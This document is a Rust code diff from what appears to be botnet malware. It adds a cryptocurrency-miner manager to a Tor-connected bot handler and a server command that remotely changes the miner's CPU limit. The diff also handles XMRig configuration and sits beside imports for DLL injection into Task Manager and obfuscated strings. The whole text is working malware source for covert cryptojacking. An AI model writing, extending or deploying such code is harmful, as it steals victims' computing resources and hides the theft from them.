@@ -19,6 +19,7 @@ use shared::{
 use obfstr::obfstr as s;
 use tokio::sync::{ Mutex, RwLock };
 use crate::{
+    miner::manager::MinerManager,
     tasks::task_manager_hook::{ inject_dll, update_query_hooker_list },
     utils::{
         system_info::{ generate_bot_state, get_dynamic_info, get_thumbnail },
@@ -37,12 +38,18 @@ pub struct BotHandler {
     tr_handler: TrHandler,
     bot_state: RwPtr<BotState>,
     terminal: Option<MutexPtr<Terminal>>,
+    miner_manager: RwPtr<MinerManager>,
 }
 
 impl BotHandler {
-    pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
-        let tor_handler = TrHandler::new(logger_config).await?;
+    pub async fn new(miner_ref: Arc<RwLock<MinerManager>>) -> Result<Self> {
+        println!("making tor handler");
+        let tor_handler = TrHandler::new().await?;
+        println!("generate_bot_state");
+
         let bot_state = generate_bot_state().await;
+        println!("Terminal");
+
         let terminal = match Terminal::new() {
             Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
             Err(error) => {
@@ -50,16 +57,16 @@ impl BotHandler {
                 None
             }
         };
+
         Ok(BotHandler {
+            miner_manager: miner_ref,
             tr_handler: tor_handler,
             bot_state: Arc::new(RwLock::new(bot_state)),
             terminal,
         })
     }
-
     pub async fn run_handler(&mut self) {
         let self_clone = Arc::new(RwLock::new(self.clone()));
-
         self.tr_handler.run::<_, _, BotHandler>(
             self_clone,
             Self::receive_data,
@@ -354,6 +361,20 @@ impl BotHandler {
                         ServerAction::XMRigConfig,
                         ServerParams::XMRigConfig(data)
                     ).await?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::EditMinerCPULimit => {
+                if let ClientParams::EditMinerCPULimit(params) = processed_data.params {
+                    self_ref
+                        .read().await
+                        .miner_manager.write().await
+                        .modify_cpu_limit(params.new_cpu_limit).await?;
                 } else {
                     return Err(
                         anyhow::anyhow!(
